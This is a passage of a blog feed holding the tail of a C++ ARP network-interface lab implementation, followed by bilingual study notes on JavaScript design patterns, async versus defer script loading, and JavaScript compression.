class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;network_interface.hh&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;arp_message.hh&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;ethernet_frame.hh&quot;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-comment">// ethernet_address: Ethernet (what ARP calls &quot;hardware&quot;) address of the interface</span><br><span class="hljs-comment">// ip_address: IP (what ARP calls &quot;protocol&quot;) address of the interface</span><br><span class="hljs-comment">// cppcheck-suppress uninitMemberVar</span><br>NetworkInterface::<span class="hljs-built_in">NetworkInterface</span>(<span class="hljs-type">const</span> EthernetAddress &amp;ethernet_address, <span class="hljs-type">const</span> Address &amp;ip_address)<br>    : <span class="hljs-built_in">ethernet_address_</span>(ethernet_address), <span class="hljs-built_in">ip_address_</span>(ip_address)<br>&#123;<br>    cerr &lt;&lt; <span class="hljs-string">&quot;DEBUG: Network interface has Ethernet address &quot;</span> &lt;&lt; <span class="hljs-built_in">to_string</span>(ethernet_address_) &lt;&lt; <span class="hljs-string">&quot; and IP address &quot;</span><br>         &lt;&lt; ip_address.<span class="hljs-built_in">ip</span>() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// dgram: the IPv4 datagram to be sent</span><br><span class="hljs-comment">// next_hop: the IP address of the interface to send it to (typically a router or default gateway, but</span><br><span class="hljs-comment">// may also be another host if directly connected to the same network as the destination)</span><br><br><span class="hljs-comment">// Note: the Address type can be converted to a uint32_t (raw 32-bit IP address) by using the</span><br><span class="hljs-comment">// Address::ipv4_numeric() method.</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">NetworkInterface::send_datagram</span><span class="hljs-params">(<span class="hljs-type">const</span> InternetDatagram &amp;dgram, <span class="hljs-type">const</span> Address &amp;next_hop)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 下一跳的地址</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> addr_numeric = next_hop.<span class="hljs-built_in">ipv4_numeric</span>();<br><br>    <span class="hljs-comment">/* ARP Table has stored the mapping info, we send the datagram directly */</span><br>  <span class="hljs-comment">// 如果ARP Table包含下一跳的地址，直接</span><br>    <span class="hljs-keyword">if</span> (arp_table_.<span class="hljs-built_in">contains</span>(addr_numeric)) &#123;<br>        EthernetFrame eth_frame;<br>      <span class="hljs-comment">// 当前物理机以太网地址</span><br>        eth_frame.header.src = ethernet_address_;<br>      <span class="hljs-comment">// 目标物理机以太网地址</span><br>        eth_frame.header.dst = arp_table_.<span class="hljs-built_in">at</span>(addr_numeric).eth_addr;<br>        eth_frame.header.type = EthernetHeader::TYPE_IPv4;<br>      <span class="hljs-comment">// 序列化</span><br>        eth_frame.payload = <span class="hljs-built_in">serialize</span>(dgram);<br>      <span class="hljs-comment">// 发乳待发送缓冲区</span><br>        outbound_frames_.<span class="hljs-built_in">push</span>(eth_frame);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// 没有则发送arp请求</span><br>        <span class="hljs-comment">/* ARP Table has no such mapping and we haven&#x27;t send an ARP request for target ip */</span><br>        <span class="hljs-keyword">if</span> (arp_requests_lifetime_.<span class="hljs-built_in">find</span>(addr_numeric) == arp_requests_lifetime_.<span class="hljs-built_in">end</span>()) &#123;<br>            <span class="hljs-comment">// next hop ipv4 addr is not contained in the arp requests waiting list</span><br>            ARPMessage arp_msg;<br>            arp_msg.opcode = ARPMessage::OPCODE_REQUEST;<br>            arp_msg.sender_ip_address = ip_address_.<span class="hljs-built_in">ipv4_numeric</span>();<br>            arp_msg.sender_ethernet_address = ethernet_address_;<br>            arp_msg.target_ip_address = addr_numeric;<br>            arp_msg.target_ethernet_address = &#123;<span class="hljs-comment">/* empty */</span>&#125;;<br><br>            EthernetFrame arp_eth_frame;<br>            arp_eth_frame.header.src = ethernet_address_;<br>            arp_eth_frame.header.dst = ETHERNET_BROADCAST;<br>            arp_eth_frame.header.type = EthernetHeader::TYPE_ARP;<br>            arp_eth_frame.payload = <span class="hljs-built_in">serialize</span>(arp_msg);<br>            outbound_frames_.<span class="hljs-built_in">push</span>(arp_eth_frame);<br><br>          <span class="hljs-comment">// 广播请求</span><br>            arp_requests_lifetime_.<span class="hljs-built_in">emplace</span>(std::<span class="hljs-built_in">make_pair</span>(addr_numeric, ARP_REQUEST_DEFAULT_TTL));<br>        &#125;<br>        <span class="hljs-comment">// We need to store the datagram in the list. After we know the eth addr, we can queue</span><br>        <span class="hljs-comment">// the corresponding dgrams.</span><br>      <span class="hljs-comment">// 广播下一跳的以太网地址的 ARP 请求， 并将 IP 报文放入队列中待 ARP 回复收到后能将其发送出去。</span><br>        arp_datagrams_waiting_list_.<span class="hljs-built_in">emplace_back</span>(std::pair &#123;next_hop, dgram&#125;);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// frame: the incoming Ethernet frame</span><br><span class="hljs-function">optional&lt;InternetDatagram&gt; <span class="hljs-title">NetworkInterface::recv_frame</span><span class="hljs-params">(<span class="hljs-type">const</span> EthernetFrame &amp;frame)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// 如果当前frame的目标物理机不是当前物理机且也不是广播请求的目标物理机，直接返回</span><br>    <span class="hljs-keyword">if</span> (frame.header.dst != ethernet_address_ &amp;&amp; frame.header.dst != ETHERNET_BROADCAST) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">nullopt</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* IP datagrams，是IP数据报，反序列数据并直接返回datagram */</span><br>    <span class="hljs-keyword">if</span> (frame.header.type == EthernetHeader::TYPE_IPv4) &#123;<br>        InternetDatagram datagram;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> <span class="hljs-built_in">parse</span>(datagram, frame.payload)) &#123;<br>            <span class="hljs-comment">// printf(&quot;[NetworkInterface ERROR]: &#x27;recv_frame&#x27; IPV4 parse error\n&quot;);</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullopt</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> datagram;<br>    &#125;<br><br>    <span class="hljs-comment">/* ARP datagrams，广播数据报 */</span><br>    <span class="hljs-keyword">if</span> (frame.header.type == EthernetHeader::TYPE_ARP) &#123;<br>        ARPMessage arp_msg;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> <span class="hljs-built_in">parse</span>(arp_msg, frame.payload)) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[NetworkInterface ERROR]: &#x27;recv_frame&#x27; ARP parse error\n&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullopt</span>;<br>        &#125;<br><br>        <span class="hljs-type">const</span> <span class="hljs-type">bool</span> is_arp_request = arp_msg.opcode == ARPMessage::OPCODE_REQUEST<br>                                    &amp;&amp; arp_msg.target_ip_address == ip_address_.<span class="hljs-built_in">ipv4_numeric</span>();<br>        <span class="hljs-comment">// 如果是广播请求，则回复即可</span><br>      <span class="hljs-keyword">if</span> (is_arp_request) &#123;<br>            ARPMessage arp_reply_msg;<br>            arp_reply_msg.opcode = ARPMessage::OPCODE_REPLY;<br>            arp_reply_msg.sender_ip_address = ip_address_.<span class="hljs-built_in">ipv4_numeric</span>();<br>            arp_reply_msg.sender_ethernet_address = ethernet_address_;<br>            arp_reply_msg.target_ip_address = arp_msg.sender_ip_address;<br>            arp_reply_msg.target_ethernet_address = arp_msg.sender_ethernet_address;<br><br>            EthernetFrame arp_reply_eth_frame;<br>            arp_reply_eth_frame.header.src = ethernet_address_;<br>            arp_reply_eth_frame.header.dst = arp_msg.sender_ethernet_address;<br>            arp_reply_eth_frame.header.type = EthernetHeader::TYPE_ARP;<br>            arp_reply_eth_frame.payload = <span class="hljs-built_in">serialize</span>(arp_reply_msg);<br>            outbound_frames_.<span class="hljs-built_in">push</span>(arp_reply_eth_frame);<br>        &#125;<br><br>      <span class="hljs-comment">// 如果是响应，对应上面send发送的广播数据报</span><br>        <span class="hljs-type">const</span> <span class="hljs-type">bool</span> is_arp_response<br>            = arp_msg.opcode == ARPMessage::OPCODE_REPLY &amp;&amp; arp_msg.target_ethernet_address == ethernet_address_;<br><br>        <span class="hljs-comment">// we can get arp info from either ARP request or ARP reply</span><br>        <span class="hljs-keyword">if</span> (is_arp_request || is_arp_response) &#123;<br>          <span class="hljs-comment">// 更新arp_table</span><br>            arp_table_.<span class="hljs-built_in">emplace</span>(std::<span class="hljs-built_in">make_pair</span>(arp_msg.sender_ip_address,<br>                                              <span class="hljs-type">arp_t</span> &#123;arp_msg.sender_ethernet_address, ARP_DEFAULT_TTL&#125;));<br>            <span class="hljs-comment">// delete arp datagrams waiting list，并且发送该存储的请求</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = arp_datagrams_waiting_list_.<span class="hljs-built_in">begin</span>(); iter != arp_datagrams_waiting_list_.<span class="hljs-built_in">end</span>();) &#123;<br>                <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;[ipv4_addr, datagram] = *iter;<br>                <span class="hljs-keyword">if</span> (ipv4_addr.<span class="hljs-built_in">ipv4_numeric</span>() == arp_msg.sender_ip_address) &#123;<br>                    <span class="hljs-built_in">send_datagram</span>(datagram, ipv4_addr);<br>                    iter = arp_datagrams_waiting_list_.<span class="hljs-built_in">erase</span>(iter);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    iter++;<br>                &#125;<br>            &#125;<br>            arp_requests_lifetime_.<span class="hljs-built_in">erase</span>(arp_msg.sender_ip_address);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullopt</span>;<br>&#125;<br><br><span class="hljs-comment">// ms_since_last_tick: the number of milliseconds since the last call to this method</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">NetworkInterface::tick</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">size_t</span> ms_since_last_tick)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/* delete expired ARP items in ARP Table */</span><br>    <span class="hljs-comment">// <span class="hljs-doctag">FIXME:</span> Don&#x27;t use &#x27;iter++&#x27; if we have erase current iter&#x27;s data!</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = arp_table_.<span class="hljs-built_in">begin</span>(); iter != arp_table_.<span class="hljs-built_in">end</span>(); <span class="hljs-comment">/* nop */</span>) &#123;<br>        <span class="hljs-keyword">auto</span> &amp;[ipv4_addr_numeric, arp] = *iter;<br>        <span class="hljs-keyword">if</span> (arp.ttl &lt;= ms_since_last_tick) &#123;<br>            iter = arp_table_.<span class="hljs-built_in">erase</span>(iter);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            arp.ttl -= ms_since_last_tick;<br>            iter++;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* delete expired ARP requests */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;[ipv4_addr, arp_ttl] : arp_requests_lifetime_) &#123;<br>        <span class="hljs-comment">/* resent ARP request if this request has expired，使得任何已经过期的 IP 地址到 Ethernet 地址的映射失效 */</span> <br>        <span class="hljs-keyword">if</span> (arp_ttl &lt;= ms_since_last_tick) &#123;<br>            ARPMessage arp_msg;<br>            arp_msg.opcode = ARPMessage::OPCODE_REQUEST;<br>            arp_msg.sender_ip_address = ip_address_.<span class="hljs-built_in">ipv4_numeric</span>();<br>            arp_msg.sender_ethernet_address = ethernet_address_;<br>            arp_msg.target_ip_address = ipv4_addr;<br>            arp_msg.target_ethernet_address = &#123;<span class="hljs-comment">/* empty */</span>&#125;;<br><br>            EthernetFrame arp_eth_frame;<br>            arp_eth_frame.header.src = ethernet_address_;<br>            arp_eth_frame.header.dst = ETHERNET_BROADCAST;<br>            arp_eth_frame.header.type = EthernetHeader::TYPE_ARP;<br>            arp_eth_frame.payload = <span class="hljs-built_in">serialize</span>(arp_msg);<br>            outbound_frames_.<span class="hljs-built_in">push</span>(arp_eth_frame);<br><br>            <span class="hljs-comment">/* reset ARP ttl for this component */</span><br>            arp_ttl = ARP_REQUEST_DEFAULT_TTL;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            arp_ttl -= ms_since_last_tick;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function">optional&lt;EthernetFrame&gt; <span class="hljs-title">NetworkInterface::maybe_send</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!outbound_frames_.<span class="hljs-built_in">empty</span>()) &#123;<br>        EthernetFrame eth_frame = std::<span class="hljs-built_in">move</span>(outbound_frames_.<span class="hljs-built_in">front</span>());<br>        outbound_frames_.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-keyword">return</span> eth_frame;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullopt</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ip-router">IP Router</h2><h2 id="together">Together</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/emocoder/2023/07/15/Design%20Pattern/"/>
    <url>/emocoder/2023/07/15/Design%20Pattern/</url>
    
    <content type="html"><![CDATA[<h1id="设计模式渲染模式优化react">设计模式&amp;渲染模式&amp;优化&amp;React</h1><h2 id="design-pattern">Design Pattern</h2><p>Singleton pattern：This <em>single instance</em> can be sharedthroughout our application, which makes Singletons great for managingglobal state in an application.</p><p>特点：</p><ol type="1"><li>Singletons are classes which can be instantiated once</li><li>can be accessed globally</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> instance;<br><span class="hljs-keyword">let</span> counter = <span class="hljs-number">0</span>;<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">if</span> (instance) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;You can only create one instance!&quot;</span>);<br>    &#125;<br>    instance = <span class="hljs-variable language_">this</span>;<br>  &#125;<br> <br>  <span class="hljs-title function_">getInstance</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;<br>  &#125;<br> <br>  <span class="hljs-title function_">getCount</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> counter;<br>  &#125;<br> <br>  <span class="hljs-title function_">increment</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> ++counter;<br>  &#125;<br> <br>  <span class="hljs-title function_">decrement</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> --counter;<br>  &#125;<br>&#125;<br> <br><span class="hljs-keyword">const</span> singletonCounter = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>());<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> singletonCounter;<br></code></pre></td></tr></table></figure><h2 id="tradeoffs">Tradeoffs</h2><p>In many programming languages, such as Java or C++, it's not possibleto directly create objects the way we can in JavaScript. In thoseobject-oriented programming languages, we need to create a class, whichcreates an object. That created object has the value of the instance ofthe class, just like the value of <code>instance</code> in theJavaScript example.</p><p>However, the class implementation shown in the examples above isactually overkill. Since we can directly create objects in JavaScript,we can simply use a regular object to achieve the exact same result.Let's cover some of the disadvantages of using Singletons!</p><p>js的字面量很容易写出单粒模式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">const</span> counter = &#123;<br>  <span class="hljs-title function_">increment</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> ++count;<br>  &#125;,<br>  <span class="hljs-title function_">decrement</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> --count;<br>  &#125;<br>&#125;;<br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(counter);<br><span class="hljs-keyword">export</span> &#123; counter &#125;;<br></code></pre></td></tr></table></figure><p>In React, we often rely on a global state through state managementtools such as <strong>Redux</strong> or <strong>React Context</strong>instead of using Singletons. Although their global state behavior mightseem similar to that of a Singleton, these tools provide a<strong>read-only state</strong> rather than the <em>mutable</em> stateof the Singleton. When using Redux, only pure function <em>reducers</em>can update the state, after a component has sent an <em>action</em>through a <em>dispatcher</em>.</p><p>Although the downsides to having a global state don't magicallydisappear by using these tools, we can at least make sure that theglobal state is mutated the way we intend it, since components cannotupdate the state directly.</p><p>Proxy</p><p>代理对象控制了我们和原对象交互时的行为，它拦截了任何action whichinteract with object</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">const person</span> = &#123;<br>  name: <span class="hljs-string">&quot;John Doe&quot;</span>,<br>  age: 42,<br>  nationality: <span class="hljs-string">&quot;American&quot;</span>,<br>&#125;;<br> <br><span class="hljs-attribute">const personProxy</span> = new Proxy(person, &#123;&#125;);<br></code></pre></td></tr></table></figure><p>https://res.cloudinary.com/ddxwdqwkr/video/upload/f_auto/v1609056520/patterns.dev/jspat-51_xvbob9.mp4</p><p>Provider</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">DataContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>()<br> <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> data = &#123; ... &#125;<br> <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">DataContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;data&#125;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">SideBar</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Content</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">DataContext.Provider</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br></code></pre></td></tr></table></figure><p>https://res.cloudinary.com/ddxwdqwkr/video/upload/f_auto/v1609056518/patterns.dev/jspat-48_jxmuyy.mp4</p><p>Prototype</p><h2 id="performance">Performance</h2><h3 id="preload-vs-prefetch">preload vs prefetch</h3><h3 id="async-vs-defer">async vs defer</h3><p>现代的网站中，脚本往往比 HTML更“重”：它们的大小通常更大，处理时间也更长。</p><p>当浏览器加载 HTML 时遇到<code>&lt;script&gt;...&lt;/script&gt;</code> 标签，浏览器就不能继续构建DOM。它必须立刻执行此脚本。对于外部脚本<code>&lt;script src="..."&gt;&lt;/script&gt;</code>也是一样的：浏览器必须等脚本下载完，并执行结束，之后才能继续处理剩余的页面。</p><p>这会导致两个重要的问题：</p><ol type="1"><li>脚本不能访问到位于它们下面的 DOM元素，因此，脚本无法给它们添加处理程序等。</li><li>如果页面顶部有一个笨重的脚本，它会“阻塞页面”。在该脚本下载并执行结束前，用户都不能看到页面内容</li></ol><p>🌰：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>...content before script...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://javascript.info/article/script-async-defer/long.js?speed=1&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- This isn&#x27;t visible until the script loads --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>...content after script...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里有一些解决办法。例如，我们可以把脚本放在页面底部。此时，它可以访问到它上面的元素，并且不会阻塞页面显示内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  ...all content is above the script...<br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://javascript.info/article/script-async-defer/long.js?speed=1&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>但是这种解决方案远非完美。例如，浏览器只有在下载了完整的 HTML文档之后才会下载该脚本（获取更多的资源）。对于长的 HTML文档来说，这样可能会造成明显的延迟。</p><p>如下例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  ...all content is above the script...<br>100000 lines omit ..........<br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://javascript.info/article/script-async-defer/long.js?speed=1&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>执行上面100000行，这时候遇到了script才去下载。有一种想法：script能不能放在前面，只是提前获取这个脚本，但是不执行，这样就不会，阻塞后续DOM的解析了。由此产生了defer：</p><p>defer：遇到脚本，先下载，但是不执行，可以想象在js单线程的场景下如何实现——队列，这些任务放在队列里[promise1,promise2]，呆到特定时机（DomContentLoaded）去执行这个队列，队列里任务的顺序和脚本出现的顺序相关，所以defer有一个优点，很好地通过手动编排script出现的顺序保证了存在依赖脚本的加载顺序。</p><p>可不可以通过并行的角度实现呢？</p><p>遇到脚本，下载的同时并执行，async就是这样的思路，每个附带async的script都是独立的一个任务，放在单独一个线程里去下下载并执行，但是这样不能保证脚本的执行顺序。</p><p>这对于使用高速连接的人来说，这不值一提，他们不会感受到这种延迟。但是这个世界上仍然有很多地区的人们所使用的网络速度很慢，并且使用的是远非完美的移动互联网连接。</p><p>幸运的是，这里有两个 <code>&lt;script&gt;</code>特性（attribute）可以为我们解决这个问题：<code>defer</code> 和<code>async</code>。</p><blockquote><p>参考：</p><p>https://zh.javascript.info/script-async-defer</p></blockquote><p>https://zhuanlan.zhihu.com/p/48521680</p><p>缓存</p><h3 id="server-push">Server push</h3><h3 id="http-itself">http itself</h3><h3 id="client">client</h3><h3id="bundle-splitting-split-your-code-into-small-reusable-pieces">Bundlesplitting: Split your code into small, reusable pieces</h3><h3 id="loading-sequence">loading sequence</h3><h3 id="performance-metrics">performance metrics</h3><h3 id="tree-shaking">tree shaking</h3><p>wip</p><h3 id="lazy-loading">lazy loading</h3><p>wip</p><h3 id="route-base-splitting">route Base Splitting</h3><p>Dynamically load components based on the current route</p><h3 id="dynamic-import-vs-static-import">Dynamic import vs staticimport</h3><ol type="1"><li><p>Static import</p></li><li><p>Dynamic import: 仅导入你需要的模块</p></li><li><p>Load non-critical components when they are visible in theviewport</p></li><li><p>Load non-critical resources when a user interacts with UIrequiring it</p></li></ol><h3 id="list-virtualization">list virtualization</h3><p>wip</p><h3 id="compression">compression:</h3><p>JavaScript is the second biggest <ahref="https://almanac.httparchive.org/en/2020/page-weight#fig-2">contributorto page size</a> and the second most <ahref="https://almanac.httparchive.org/en/2020/page-weight#fig-4">requestedweb resource</a> on the internet after images. We use patterns thatreduce the transfer, load, and execution time for JavaScript to improvewebsite performance. Compression can help reduce the time needed totransfer scripts over the network.</p><p>js是和页面大小相关的第二大重要因素(继图片之后)，压缩js可以减少传输时间</p><p>可以把压缩js和以下方法减少大js的影响：</p><ul><li><p>minification</p></li><li><p>code-splitting</p></li><li><p>bunding</p></li><li><p>caching</p></li><li><p>lazy-loading</p></li></ul><h4 id="http-compression">HTTP compression</h4><p>Compression reduces the size of documents and files, so they take upless disk space than the originals. Smaller documents consume lowerbandwidth and can be transferred over a network quickly. HTTPcompression uses this simple concept to compress website content, reduce<a href="https://almanac.httparchive.org/en/2020/page-weight">pageweights</a>, lower bandwidth requirement, and improve performance.</p><p>HTTP data compression may be categorized in different ways. One ofthem is lossy vs. lossless.</p><p><strong>Lossy compression</strong> implies that thecompression-decompression cycle results in a slightly altered documentwhile retaining its usability. The change is mostly imperceptible to theend-user. The most common example of lossy compression is JPEGcompression for images.</p><p>With <strong>Lossless compression,</strong> the data recovered aftercompression and subsequent decompression will match precisely with theoriginal. PNG images are an example of lossless compression. Losslesscompression is relevant to text transfers and should be applied totext-based formats such as HTML, CSS, and JavaScript.</p><p>Since you want all valid JS code on the browser, you should uselossless compression algorithms for JavaScript code. Before we compressthe JS, minification helps eliminate the unnecessary syntax and reduceit to only the code required for execution.</p><p><ahref="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Compression">HTTP协议中的数据压缩 - HTTP | MDN (mozilla.org)</a></p><h4 id="minification">Minification</h4><p>在压缩之前可以minify</p><p><ahref="https://web.dev/reduce-network-payloads-using-text-compression/#minification">Minification</a>complements compression by removing whitespace and any unnecessary codeto create a smaller but perfectly valid code file. When writing code, weuse line breaks, indentation, spaces, well-named variables, and commentsto improve code readability and maintainability.</p><p>Minification is a standard practice for JS and CSS optimization. It'scommon for JavaScript library developers to provide minified versions oftheir files for production deployments, usually denoted with a min.jsname extension. (e.g., <code>jquery.js</code> and<code>jquery.min.js</code>)</p><p>Multiple tools are available for <ahref="https://developers.google.com/speed/docs/insights/MinifyResources">theminification of HTML, CSS, and JS</a> resources. <ahref="https://github.com/terser-js/terser">Terser</a> is a popularJavaScript compression tool for ES6+, and <ahref="https://webpack.js.org/">Webpack</a> v4 includes a plugin for thislibrary by default to create minified build files. You can also use the<code>TerserWebpackPlugin</code> with older versions of Webpack or useTerser as a CLI tool without a module bundler.</p><h4 id="compression-1">Compression</h4><p>服务侧一般有两种压缩方式：</p><ol type="1"><li>static compression:在项目构建的时候压缩，一般压缩不常变化的静态资源，可以较高程度压缩，虽然压缩时间比较长</li><li>dynamic compression:当资源请求的时候才压缩，但是动态压缩一半压缩程度较低，因为压缩程度高，花费时间比较长，对于小型资源，也没啥优势，一般常用语动态资源。</li></ol><h4 id="压缩算法">压缩算法：</h4><ol type="1"><li><p>Gzip</p><p>The Gzip compression format has been around for almost 30 years andis a lossless algorithm based on the <ahref="https://www.youtube.com/watch?v=whGwm0Lky2s&amp;t=851s">Deflatealgorithm</a>. The deflate algorithm itself uses a combination of the 